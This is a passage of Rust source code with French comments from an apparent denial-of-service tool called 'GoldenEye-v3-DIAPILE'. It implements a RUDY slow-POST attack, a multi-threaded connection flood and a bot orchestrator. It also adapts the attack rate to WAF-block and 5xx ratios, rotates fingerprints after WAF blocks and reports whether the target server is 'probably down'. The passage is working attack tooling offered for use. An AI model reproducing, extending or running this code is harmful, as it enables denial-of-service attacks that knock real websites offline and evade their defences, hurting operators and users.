                    .and_then(|l| l.choose(&mut rng).cloned())
                    .unwrap_or_else(|| bot.user_agent.clone());
                let mut headers = format!("{} {} HTTP/1.1\r\n", method, path);
                headers.push_str(&format!("Host: {}\r\n", target.host));
                headers.push_str(&format!("User-Agent: {}\r\n", ua));
                headers.push_str("Content-Type: application/x-www-form-urlencoded\r\n");
                headers.push_str(&format!("Content-Length: {}\r\n", big_len));
                headers.push_str("Connection: keep-alive\r\n");
                headers.push_str("\r\n");
                let mut ep = match connect_endpoint(
                    &target,
                    connect_t,
                    Duration::from_secs(3600),
                    cfg.verify_ssl,
                ) {
                    Ok(e) => e,
                    Err(_) => {
                        stats.fails.fetch_add(1, Ordering::Relaxed);
                        continue;
                    }
                };
                stats
                    .bytes_sent
                    .fetch_add(headers.len() as u64, Ordering::Relaxed);
                if let Err(_) = ep.0.write_all(headers.as_bytes()) {
                    stats.fails.fetch_add(1, Ordering::Relaxed);
                    continue;
                }
                let delay = Duration::from_millis(cfg.rudy_chunk_delay_ms);
                let chunk_sz = cfg.rudy_chunk_size.max(1);
                let mut sent_bytes = 0usize;
                while sent_bytes < big_len && !stop.load(Ordering::Relaxed) {
                    let chunk: Vec<u8> = (0..chunk_sz).map(|_| b'X').collect();
                    match ep.0.write_all(&chunk) {
                        Ok(_) => {
                            stats
                                .bytes_sent
                                .fetch_add(chunk.len() as u64, Ordering::Relaxed);
                            sent_bytes += chunk.len();
                            stats.hits.fetch_add(1, Ordering::Relaxed);
                        }
                        Err(_) => {
                            stats.fails.fetch_add(1, Ordering::Relaxed);
                            break;
                        }
                    }
                    tokio::time::sleep(delay).await;
                }
                close_endpoint(ep);
            }
        }
    }
}

// --------- Mode Legacy (compatible workers x sockets) ---------------------
//
// ATTENTION — Ce mode utilise des OS threads NATIFS + sockets synchrones.
// Chaque worker a un seul thread, donc les handshakes TLS ne peuvent pas
// être pipelinés en série sans détruire le débit. On ouvre donc par LOTS
// parallèles de BATCH_SIZE connexions via std::thread::scope.
//
// Pour des cibles HTTPS avec une charge >50 sockets/worker il est recommandé
// d'utiliser --dos-mode browser (tokio async natif) à la place.

const LEGACY_CONNECT_BATCH: usize = 12; // parallélisme handshake TLS par worker

fn legacy_striker(
    cfg: Arc<GoldenEyeConfig>,
    target: Arc<ParsedTarget>,
    stats: GoldenEyeStats,
    stop: Arc<std::sync::atomic::AtomicBool>,
) {
    let mut rng = StdRng::from_entropy();
    let mut bot = generate_bot_profile(&mut rng, 0xDEADu64);
    // Legacy mode: réduit le connect_timeout sous HTTPS pour éviter 5s/socket en série
    let connect_t = Duration::from_millis(if target.is_ssl {
        cfg.connect_timeout_ms.min(2500)
    } else {
        cfg.connect_timeout_ms
    });
    let read_t = Duration::from_millis(cfg.read_timeout_ms);
    let spw = cfg.sockets_per_worker;

    while !stop.load(Ordering::Relaxed) {
        let mut endpoints: Vec<Endpoint> = Vec::with_capacity(spw);
        // ── Ouverture par LOTS parallèles pour amortir le handshake TLS ──
        let mut opened = 0usize;
        while opened < spw {
            if stop.load(Ordering::Relaxed) {
                break;
            }
            let remaining = spw - opened;
            let batch = remaining.min(LEGACY_CONNECT_BATCH);
            let mut batch_results: Vec<Option<Endpoint>> = (0..batch).map(|_| None).collect();
            std::thread::scope(|s| {
                let handles: Vec<_> = (0..batch)
                    .map(|slot| {
                        let tgt = Arc::clone(&target);
                        let cfg = Arc::clone(&cfg);
                        s.spawn(move || -> (usize, Option<Endpoint>) {
                            let res =
                                connect_endpoint(&tgt, connect_t, read_t, cfg.verify_ssl).ok();
                            (slot, res)
                        })
                    })
                    .collect();
                for h in handles {
                    if let Ok((slot, ep)) = h.join() {
                        batch_results[slot] = ep;
                    }
                }
            });
            let oks = batch_results.iter().flatten().count();
            let fails = batch - oks;
            if fails > 0 {
                stats.fails.fetch_add(fails as u64, Ordering::Relaxed);
            }
            for ep in batch_results.into_iter().flatten() {
                endpoints.push(ep);
            }
            opened += batch;
        }

        // ── Génération requêtes ────────────────────────────────────────────
        let mut reqs: Vec<Vec<u8>> = Vec::with_capacity(endpoints.len());
        for _ in &endpoints {
            let m = match cfg.method {
                DosMethod::Get => "GET",
                DosMethod::Post => "POST",
                DosMethod::Random => {
                    if rng.gen_bool(0.5) {
                        "GET"
                    } else {
                        "POST"
                    }
                }
            };
            reqs.push(build_modern_request(
                &target,
                &cfg,
                &mut bot,
                m,
                &target.path,
                &mut rng,
                None,
            ));
        }
        // ── Emission + lecture réponse ─────────────────────────────────────
        for (ep, req) in endpoints.iter_mut().zip(reqs.iter()) {
            if stop.load(Ordering::Relaxed) {
                break;
            }
            stats
                .bytes_sent
                .fetch_add(req.len() as u64, Ordering::Relaxed);
            match ep.0.write_all(req) {
                Ok(_) => {
                    let mut buf = [0u8; 2048];
                    match ep.0.read(&mut buf) {
                        Ok(n) if n > 0 => {
                            stats.bytes_recv.fetch_add(n as u64, Ordering::Relaxed);
                            if let Some(code) = parse_status(&buf[..n]) {
                                stats.count_code(code);
                                if (200..=399).contains(&code) {
                                    stats.hits.fetch_add(1, Ordering::Relaxed);
                                } else {
                                    stats.fails.fetch_add(1, Ordering::Relaxed);
                                }
                            } else {
                                stats.hits.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                        _ => {
                            stats.fails.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                Err(_) => {
                    stats.fails.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
        for e in endpoints {
            close_endpoint(e);
        }
    }
}

// --------- Orchestrateur principal -----------------------------------------
pub async fn run_goldeneye(
    cfg: &GoldenEyeConfig,
    emitter: Option<DashboardEmitter>,
) -> anyhow::Result<GoldenEyeStats> {
    if cfg.url.trim().is_empty() {
        anyhow::bail!("URL manquante");
    }
    let target = Arc::new(parse_url(&cfg.url)?);
    let stats = GoldenEyeStats::new();
    let stats_clone = stats.clone();
    let stats_ws = stats.clone();
    let cfg = Arc::new(cfg.clone());
    let cfg_ws = cfg.clone();
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let stop_mon = stop.clone();
    let stop_ws = stop.clone();

    // Legacy OS-threaded Flood si mode==Flood ET workers > 0 ET sockets_per_worker >= 100
    let use_legacy_mode =
        matches!(cfg.attack_mode, AttackMode::Flood) && cfg.sockets_per_worker >= 50;
    let bots_spawned: u64 = if use_legacy_mode {
        (cfg.workers.saturating_mul(cfg.sockets_per_worker)) as u64
    } else {
        cfg.num_bots.max(cfg.workers) as u64
    };
    let bots_concurrent: u64 = if use_legacy_mode {
        (cfg.workers.saturating_mul(cfg.sockets_per_worker.min(32))) as u64
    } else {
        cfg.max_concurrent_bots as u64
    };

    let mut handles = Vec::new();
    if use_legacy_mode {
        for _ in 0..cfg.workers {
            let wcfg = cfg.clone();
            let wtgt = target.clone();
            let wstats = stats.clone();
            let wstop = stop.clone();
            let h = std::thread::Builder::new()
                .name("ge-legacy".into())
                .spawn(move || legacy_striker(wcfg, wtgt, wstats, wstop))
                .map_err(|e| anyhow::anyhow!("legacy worker: {}", e))?;
            handles.push(tokio::task::spawn_blocking(move || {
                let _ = h.join();
            }));
        }
    } else {
        let sem = Arc::new(Semaphore::new(cfg.max_concurrent_bots.max(1)));
        let start_id = cfg.bot_id_offset;
        let end_id = cfg
            .bot_id_offset
            .saturating_add(cfg.num_bots.max(cfg.workers) as u64);
        for bot_id in start_id..end_id {
            let permit = sem
                .clone()
                .acquire_owned()
                .await
                .map_err(|e| anyhow::anyhow!("semaphore: {}", e))?;
            let bcfg = cfg.clone();
            let btgt = target.clone();
            let bstats = stats.clone();
            let bstop = stop.clone();
            let mode = cfg.attack_mode;
            let handle = tokio::spawn(async move {
                let _permit = permit;
                run_bot_task(bot_id, bcfg, btgt, bstats, bstop, mode).await;
            });
            handles.push(handle);
        }
    }

    // ── WebSocket ticker DDoS (500 ms) — si emitter fourni ──────────────
    let mut ws_handle: Option<tokio::task::JoinHandle<()>> = None;
    if let Some(em) = emitter {
        let tgt_url = cfg_ws.url.clone();
        let method_label = format!(
            "{} · {}",
            cfg_ws.attack_mode.as_str(),
            cfg_ws.method.as_str()
        );
        let rps_peak = Arc::new(AtomicU64::new(0));
        let rps_peak_c = rps_peak.clone();
        let stats_c = stats_ws.clone();
        let stop_c = stop_ws.clone();
        let cfg_c = cfg_ws.clone();
        ws_handle = Some(tokio::spawn(async move {
            let mut tick = tokio::time::interval(Duration::from_millis(500));
            let mut last_hits: u64 = 0;
            let mut last_fails: u64 = 0;
            let mut last_tick = Instant::now();
            // Adaptation: hystérésis 30s pour remonter à factor 1.0
            let mut adapt_factor: f64 = 1.0;
            let mut adapt_state: &str;
            let mut recovery_until: Option<Instant> = None;
            loop {
                if stop_c.load(Ordering::Relaxed) {
                    break;
                }
                tick.tick().await;
                let now = Instant::now();
                let dt = now.duration_since(last_tick).as_secs_f64().max(0.05);
                let hits = stats_c.hits.load(Ordering::Relaxed);
                let fails = stats_c.fails.load(Ordering::Relaxed);
                let dh = hits.saturating_sub(last_hits);
                let df = fails.saturating_sub(last_fails);
                last_hits = hits;
                last_fails = fails;
                last_tick = now;
                let rps = (dh + df) as f64 / dt;
                // Peak RPS (arrondi, atomique)
                let prev_peak = rps_peak_c.load(Ordering::Relaxed);
                let rps_int = rps.round() as u64;
                if rps_int > prev_peak {
                    let _ = rps_peak_c.compare_exchange(
                        prev_peak,
                        rps_int,
                        Ordering::Relaxed,
                        Ordering::Relaxed,
                    );
                }
                let rps_peak_val = rps_peak_c.load(Ordering::Relaxed) as f64;

                let w2x = stats_c.code_2xx.load(Ordering::Relaxed);
                let w3x = stats_c.code_3xx.load(Ordering::Relaxed);
                let w4x = stats_c.code_4xx.load(Ordering::Relaxed);
                let w5x = stats_c.code_5xx.load(Ordering::Relaxed);
                let wf = stats_c.waf_blocks.load(Ordering::Relaxed);
                let rot = stats_c.bots_rotated.load(Ordering::Relaxed);
                let total_resp = w2x + w3x + w4x + w5x;
                let ok_pct = if total_resp == 0 {
                    0.0
                } else {
                    (w2x + w3x) as f64 * 100.0 / total_resp as f64
                };
                let r5xx = if total_resp == 0 {
                    0.0
                } else {
                    w5x as f64 / total_resp as f64
                };
                let rwaf = if total_resp == 0 {
                    0.0
                } else {
                    wf as f64 / total_resp as f64
                };

                // ── Boucle adaptative (seuils coordinator HORDE) ───────
                let trigger = r5xx > 0.30 || rwaf > 0.15;
                if trigger {
                    adapt_factor = 0.5;
                    adapt_state = "THROTTLE · x0.5 (WAF/5xx)";
                    recovery_until = Some(now + Duration::from_secs(30));
                } else if let Some(until) = recovery_until {
                    if now >= until {
                        // Vérifier hystérésis: r5xx <= 0.20 ET rwaf <= 0.08
                        if r5xx <= 0.20 && rwaf <= 0.08 {
                            adapt_factor = 1.0;
                            adapt_state = "STABLE · x1.0";
                            recovery_until = None;
                        } else {
                            adapt_state = "RECOVERY · x0.5 (wait 30s)";
                        }
                    } else {
                        adapt_state = "RECOVERY · x0.5 (hystérésis)";
                    }
                } else {
                    adapt_state = "STABLE · x1.0";
                }

                let tx_mb = stats_c.bytes_sent.load(Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
                let rx_mb = stats_c.bytes_recv.load(Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
                let t_ms = SystemTime::now()
                    .duration_since(SystemTime::UNIX_EPOCH)
                    .map(|d| d.as_millis() as u64)
                    .unwrap_or(0);

                let ev = DashboardEvent::DdosTick {
                    t: t_ms,
                    target: tgt_url.clone(),
                    method: method_label.clone(),
                    bots_spawned,
                    bots_concurrent,
                    rps,
                    rps_peak: rps_peak_val,
                    ok_pct,
                    hits,
                    fails,
                    code_2xx: w2x,
                    code_3xx: w3x,
                    code_4xx: w4x,
                    code_5xx: w5x,
                    waf_blocks: wf,
                    r5xx,
                    rwaf,
                    bots_rotated: rot,
                    adapt_factor,
                    adapt_state: adapt_state.to_string(),
                    bytes_sent_mb: tx_mb,
                    bytes_recv_mb: rx_mb,
                    workers: Vec::<DdosWorkerRow>::new(),
                };
                em.send(ev).await;
                // Suppress warnings pour cfg_c non utilisé ultérieurement
                let _ = &cfg_c;
            }
        }));
    }

    // Monitor loop
    let start = Instant::now();
    let dur_limit = cfg.duration_secs.map(Duration::from_secs);
    let mut last: (u64, u64) = (0, 0);
    let stop_watch = stop_mon.clone();
    let _sig = tokio::spawn(async move {
        let _ = tokio::signal::ctrl_c().await;
        eprintln!("\n[GE-BOTS] CTRL+C → arrêt gracile de TOUS les bots ...");
        stop_watch.store(true, Ordering::SeqCst);
    });

    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;
        let snap = stats_clone.snapshot();
        let hits_delta = snap.0.saturating_sub(last.0);
        let fails_delta = snap.1.saturating_sub(last.1);
        last = snap;
        let elapsed = start.elapsed();
        {
            let w2x = stats_clone.code_2xx.load(Ordering::Relaxed);
            let w4x = stats_clone.code_4xx.load(Ordering::Relaxed);
            let w5x = stats_clone.code_5xx.load(Ordering::Relaxed);
            let wf = stats_clone.waf_blocks.load(Ordering::Relaxed);
            let rot = stats_clone.bots_rotated.load(Ordering::Relaxed);
            let tx_mb = stats_clone.bytes_sent.load(Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
            let rx_mb = stats_clone.bytes_recv.load(Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
            let remain = dur_limit.map(|d| d.saturating_sub(elapsed).as_secs());
            let hit_rate = hits_delta;
            let pct = w2x + w4x + w5x;
            let p_ok = if pct == 0 {
                0.0
            } else {
                w2x as f64 * 100.0 / pct as f64
            };
            eprintln!(
                "  \x1b[2K\r  \x1b[38;5;48m[GE]\x1b[0m t={:>5.1}s  hits={:<8} (+{}/s)  fails={:<6} (+{}/s)  \
                 2xx={} 4xx={} 5xx={} waf={} rot={}  ok={:.0}%  tx={:.1}M rx={:.1}M{}",
                elapsed.as_secs_f64(), snap.0, hit_rate, snap.1, fails_delta,
                w2x, w4x, w5x, wf, rot, p_ok, tx_mb, rx_mb,
                remain.map(|r| format!("  ⏱️ {}s rest", r)).unwrap_or_default()
            );
        }
        if cfg.debug {
            if elapsed.as_secs() % 10 == 0 && elapsed.as_secs() > 0 {
                eprintln!(
                    "  \x1b[90m[DEBUG-GE]\x1b[0m full snapshot at {:.0}s · total requests = {}",
                    elapsed.as_secs_f64(),
                    snap.0.saturating_add(snap.1)
                );
            }
        }
        if stop_mon.load(Ordering::Relaxed) {
            break;
        }
        if let Some(dl) = dur_limit {
            if start.elapsed() >= dl {
                stop_mon.store(true, Ordering::SeqCst);
                eprintln!(
                    "\n[GE-BOTS] ⏱️  Durée atteinte ({:.0}s). Déclenchement arrêt gracile ...",
                    dl.as_secs_f64()
                );
                break;
            }
        }
    }
    if let Some(h) = ws_handle {
        h.abort();
        let _ = h.await;
    }
    for h in handles {
        let _ = h.await;
    }
    Ok(stats_clone)
}

#[allow(dead_code)]
pub fn parse_user_agents_file(path: &str) -> anyhow::Result<Vec<String>> {
    use std::io::BufRead;
    let f = std::fs::File::open(path)?;
    let reader = std::io::BufReader::new(f);
    let mut out = Vec::new();
    for line in reader.lines() {
        let l = line?.trim().to_string();
        if !l.is_empty() && !l.starts_with('#') {
            out.push(l);
        }
    }
    Ok(out)
}

pub fn report_summary(
    stats: &GoldenEyeStats,
    cfg: &GoldenEyeConfig,
) -> HashMap<String, serde_json::Value> {
    use serde_json::json;
    let mut m = HashMap::new();
    let hits = stats.hits();
    let fails = stats.fails();
    let total = hits.saturating_add(fails);
    let ratio = if fails == 0 {
        f64::INFINITY
    } else {
        hits as f64 / fails as f64
    };
    let down = hits > 100 && fails > 0 && (fails as f64 / total as f64) > 0.9;
    let elapsed_s = stats
        .start_ts
        .map(|t| t.elapsed().as_secs_f64())
        .unwrap_or(0.0);
    let rps = if elapsed_s > 0.0 {
        total as f64 / elapsed_s
    } else {
        0.0
    };
    let mb_sent = stats.bytes_sent.load(Ordering::Relaxed) as f64 / (1024.0 * 1024.0);
    let mb_recv = stats.bytes_recv.load(Ordering::Relaxed) as f64 / (1024.0 * 1024.0);

    m.insert(
        "tool".into(),
        json!("GoldenEye-v3-DIAPILE (Bots Sophistiqués)"),
    );
    m.insert("attack_mode".into(), json!(cfg.attack_mode.as_str()));
    m.insert("target_url".into(), json!(cfg.url));
    m.insert("legacy_workers".into(), json!(cfg.workers));
    m.insert(
        "legacy_sockets_per_worker".into(),
        json!(cfg.sockets_per_worker),
    );
    m.insert("modern_num_bots".into(), json!(cfg.num_bots));
    m.insert(
        "modern_max_concurrent_bots".into(),
        json!(cfg.max_concurrent_bots),
    );
    m.insert("method".into(), json!(cfg.method.as_str()));
    m.insert("verify_ssl".into(), json!(cfg.verify_ssl));
    m.insert("send_client_hints".into(), json!(cfg.send_client_hints));
    m.insert("send_sec_fetch_headers".into(), json!(cfg.send_sec_fetch));
    m.insert(
        "rotate_fingerprint_on_waf".into(),
        json!(cfg.rotate_fingerprint_on_403),
    );
    m.insert("hits_total".into(), json!(hits));
    m.insert("fails_total".into(), json!(fails));
    m.insert("total_requests".into(), json!(total));
    m.insert(
        "http_2xx".into(),
        json!(stats.code_2xx.load(Ordering::Relaxed)),
    );
    m.insert(
        "http_3xx".into(),
        json!(stats.code_3xx.load(Ordering::Relaxed)),
    );
    m.insert(
        "http_4xx".into(),
        json!(stats.code_4xx.load(Ordering::Relaxed)),
    );
    m.insert(
        "http_5xx".into(),
        json!(stats.code_5xx.load(Ordering::Relaxed)),
    );
    m.insert(
        "waf_blocks_403_429".into(),
        json!(stats.waf_blocks.load(Ordering::Relaxed)),
    );
    m.insert(
        "fingerprint_rotations".into(),
        json!(stats.bots_rotated.load(Ordering::Relaxed)),
    );
    m.insert(
        "hit_fail_ratio".into(),
        json!(if ratio.is_finite() { ratio } else { -1.0 }),
    );
    m.insert("server_probably_down".into(), json!(down));
    m.insert("elapsed_seconds".into(), json!(elapsed_s));
    m.insert("requests_per_second".into(), json!(rps));
    m.insert("traffic_mb_sent".into(), json!(mb_sent));
    m.insert("traffic_mb_received".into(), json!(mb_recv));
    m.insert(
        "slowloris_period_ms".into(),
        json!(cfg.slowloris_header_period_ms),
    );
    m.insert("rudy_chunk_size".into(), json!(cfg.rudy_chunk_size));
    m.insert("rudy_chunk_delay_ms".into(), json!(cfg.rudy_chunk_delay_ms));
    m
}
